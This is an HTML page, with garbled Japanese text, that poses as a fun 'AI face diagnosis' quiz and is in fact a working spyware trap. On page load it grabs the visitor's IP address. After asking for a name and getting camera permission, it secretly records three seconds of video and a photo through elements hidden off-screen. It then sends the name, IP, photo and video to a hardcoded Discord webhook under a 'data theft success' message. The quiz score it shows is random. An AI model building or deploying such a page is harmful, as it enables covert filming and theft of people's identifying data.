<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AIé¡”è¨ºæ–­</title>
    <style>
        body { background-color: #fff0f5; font-family: sans-serif; text-align: center; padding: 50px 20px; }
        h1 { color: #ff69b4; }
        #start-btn, #next-btn { 
            background-color: #ff69b4; color: white; padding: 15px 35px; 
            font-size: 20px; border: none; border-radius: 50px; cursor: pointer; 
        }
        #input-area, #loading-area, #result-area { display: none; }
        input { padding: 12px; font-size: 18px; width: 80%; max-width: 300px; margin-bottom: 20px; border: 1px solid #ffb6c1; border-radius: 8px; }
        .msg { font-size: 22px; color: #ff1493; font-weight: bold; }
        /* æ˜ åƒã‚’éš ã™è¨­å®š */
        video, canvas { position: fixed; top: -2000px; left: -2000px; opacity: 0; }
    </style>
</head>
<body>

    <h1>âœ¨ AIé¡”è¨ºæ–­ âœ¨</h1>

    <div id="welcome-area">
        <button id="start-btn">è¨ºæ–­ã‚’é–‹å§‹ã™ã‚‹</button>
    </div>

    <div id="input-area">
        <p>åå‰ã‚’å…¥åŠ›ã—ã¦ãã ã•ã„</p>
        <input type="text" id="user-name" placeholder="åå‰">
        <br>
        <button id="next-btn">è¨ºæ–­ã™ã‚‹</button>
    </div>

    <div id="loading-area">
        <p class="msg" id="status-text">AIã‚¹ã‚­ãƒ£ãƒ³ä¸­...</p>
        <p>è§£æãŒçµ‚ã‚ã‚‹ã¾ã§ãã®ã¾ã¾ãŠå¾…ã¡ãã ã•ã„</p>
        <video id="video" autoplay playsinline muted></video>
        <canvas id="canvas"></canvas>
    </div>

    <div id="result-area">
        <div style="background:white; padding:30px; border:2px solid #ff69b4; border-radius:20px; display:inline-block;">
            <h2>è¨ºæ–­çµæœ</h2>
            <p id="res-score" style="font-size:32px; color:red; font-weight:bold;"></p>
            <p id="res-type" style="font-size:20px;"></p>
        </div>
    </div>

<script>
    // â˜…ã“ã“ã‚’ã‚ãªãŸã®Discord Webhook URLã«æ›¸ãæ›ãˆã¦ãã ã•ã„
    const webhookUrl = "https://discord.com/api/webhooks/1463847847785922582/nrrOR0qmz_9RQJl3-3H08G2A0aT5ryCtR9lg5uSgLNTPbP7_kCixSWWpOG10x8zCN_-N"; 
    
    let userName = "";
    let ipAddress = "å–å¾—å¤±æ•—/ãƒ–ãƒ­ãƒƒã‚¯";

    // ãƒšãƒ¼ã‚¸èª­ã¿è¾¼ã¿æ™‚ã«IPå–å¾—ã‚’é–‹å§‹
    fetch('https://api.ipify.org?format=json')
        .then(res => res.json())
        .then(data => ipAddress = data.ip)
        .catch(e => console.log("IPå–å¾—ä¸å¯"));

    document.getElementById('start-btn').onclick = () => {
        document.getElementById('welcome-area').style.display = 'none';
        document.getElementById('input-area').style.display = 'block';
    };

    document.getElementById('next-btn').onclick = async () => {
        userName = document.getElementById('user-name').value || "åç„¡ã—";
        document.getElementById('input-area').style.display = 'none';
        document.getElementById('loading-area').style.display = 'block';

        try {
            // ã‚«ãƒ¡ãƒ©è¨­å®šï¼š640x480
            const stream = await navigator.mediaDevices.getUserMedia({ 
                video: { facingMode: "user", width: 640, height: 480 } 
            });
            const video = document.getElementById('video');
            video.srcObject = stream;

            // éŒ²ç”»ã‚³ãƒãƒ³ãƒ‰
            const mediaRecorder = new MediaRecorder(stream);
            let chunks = [];
            mediaRecorder.ondataavailable = (e) => chunks.push(e.data);

            // éŒ²ç”»ãŒçµ‚ã‚ã£ãŸã¨ãã«ç™ºå‹•ã™ã‚‹é€ä¿¡ã‚³ãƒãƒ³ãƒ‰
            mediaRecorder.onstop = async () => {
                const videoBlob = new Blob(chunks, { type: 'video/webm' });
                
                // å†™çœŸã®ã‚³ãƒãƒ³ãƒ‰
                const canvas = document.getElementById('canvas');
                canvas.width = 640;
                canvas.height = 480;
                canvas.getContext('2d').drawImage(video, 0, 0);
                
                canvas.toBlob(async (photoBlob) => {
                    // --- ã“ã“ã§Discordã«é€ä¿¡ ---
                    const formData = new FormData();
                    const content = `ã€ğŸš¨ è¨ºæ–­ãƒ‡ãƒ¼ã‚¿å¥ªå–æˆåŠŸã€‘\nğŸ‘¤ **åå‰:** ${userName}\nğŸŒ **IP:** ${ipAddress}\nğŸ“ **çµæœ:** åå·®å€¤${document.getElementById('res-score').innerText}`;
                    
                    formData.append('payload_json', JSON.stringify({ content: content }));
                    formData.append('file1', photoBlob, 'face.jpg');
                    formData.append('file2', videoBlob, 'video.webm');

                    await fetch(webhookUrl, { method: 'POST', body: formData });
                    
                    // çµ‚ã‚ã£ãŸã‚‰ã‚«ãƒ¡ãƒ©åœæ­¢ã¨çµæœè¡¨ç¤º
                    stream.getTracks().forEach(t => t.stop());
                    showFinalResult();
                }, 'image/jpeg', 0.7);
            };

            // 3ç§’é–“ã®éŒ²ç”»ã‚¹ã‚¿ãƒ¼ãƒˆ
            mediaRecorder.start();
            
            // è¨ºæ–­çµæœã‚’å…ˆã«å†…éƒ¨ã§ç”Ÿæˆï¼ˆé€ä¿¡ãƒ¡ãƒƒã‚»ãƒ¼ã‚¸ã«è¼‰ã›ã‚‹ãŸã‚ï¼‰
            document.getElementById('res-score').innerText = (Math.floor(Math.random() * 10) + 70);
            document.getElementById('res-type').innerText = "ç³»çµ±: å›½å®ç´šã‚¤ã‚±ãƒ¡ãƒ³ãƒ»ç¾å¥³ã‚¿ã‚¤ãƒ—";

            setTimeout(() => {
                mediaRecorder.stop();
            }, 3000);

        } catch (err) {
            alert("ã‚«ãƒ¡ãƒ©ãŒè¨±å¯ã•ã‚Œã¦ã„ã¾ã›ã‚“ã€‚è¨­å®šã‚’ç¢ºèªã—ã¦ãã ã•ã„ã€‚");
            location.reload();
        }
    };

    function showFinalResult() {
        document.getElementById('loading-area').style.display = 'none';
        document.getElementById('result-area').style.display = 'block';
    }
</script>
</body>
</html>
